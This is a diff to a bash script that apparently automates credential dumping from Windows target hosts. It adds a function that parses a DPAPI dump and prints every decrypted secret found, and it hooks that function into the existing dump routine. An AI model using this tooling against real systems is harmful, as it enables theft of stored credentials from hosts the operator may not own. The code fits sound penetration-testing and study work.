@@ -425,6 +425,46 @@ dump_laps() {
   fi
 }
 
+parse_dpapi_output() {
+  local output_file="$1"
+  echo -e "${GREEN}[DPAPI SECRETS FOUND]:${RESET}"
+
+  # Ensure we remove NULL bytes (just in case)
+  tr -d '\000' < "$output_file" > "${output_file}.clean"
+  mv "${output_file}.clean" "$output_file"
+
+  # Check if masterkeys were found using Perl regex (-P)
+  if grep -qP "\[\+\] Got [0-9]+ decrypted masterkeys" "$output_file"; then
+    masterkey_count=$(grep -oP "(?<=\[\+\] Got )[0-9]+(?= decrypted masterkeys)" "$output_file")
+    echo -e "${GREEN}  -> Found $masterkey_count decrypted masterkeys.${RESET}"
+
+    # Extract and display unique secrets
+    secrets_found=0
+    declare -A unique_secrets
+
+    # Process each line carefully
+    while IFS= read -r line || [[ -n "$line" ]]; do
+      if [[ "$line" =~ \[SYSTEM\]\[CREDENTIAL\] ]]; then
+        # Extract the relevant part of the credential using an escaped field separator
+        full_credential=$(echo "$line" | awk -F '\\[SYSTEM\\]\\[CREDENTIAL\\] ' '{print $2}')
+
+        # Ensure uniqueness
+        if [[ -n "$full_credential" && -z "${unique_secrets[$full_credential]}" ]]; then
+          echo $full_credential
+          unique_secrets["$full_credential"]=1
+          secrets_found=1
+        fi
+      fi
+    done < "$output_file"
+
+    if [[ $secrets_found -eq 0 ]]; then
+      echo -e "${YELLOW}  No DPAPI secrets found after decrypting masterkeys.${RESET}"
+    fi
+  else
+    echo -e "${YELLOW}  No DPAPI masterkeys or secrets found.${RESET}"
+  fi
+}
+
 # Function to dump DPAPI credentials
 dump_dpapi() {
   local output_file="$TARGET_DUMP_DIR/DPAPI_dump_${TARGET_HOST}.txt"
@@ -435,6 +475,7 @@ dump_dpapi() {
   if run_command "$cmd"; then
     log_operation "DPAPI" "success" "\"file_path\": \"$output_file\""
     add_log "DPAPI dump saved to $output_file"
+    parse_dpapi_output "$output_file"
   else
     log_operation "DPAPI" "failed" "\"error\": \"Failed to dump DPAPI credentials\""
     add_warning "Failed to dump DPAPI credentials on target $TARGET_HOST"
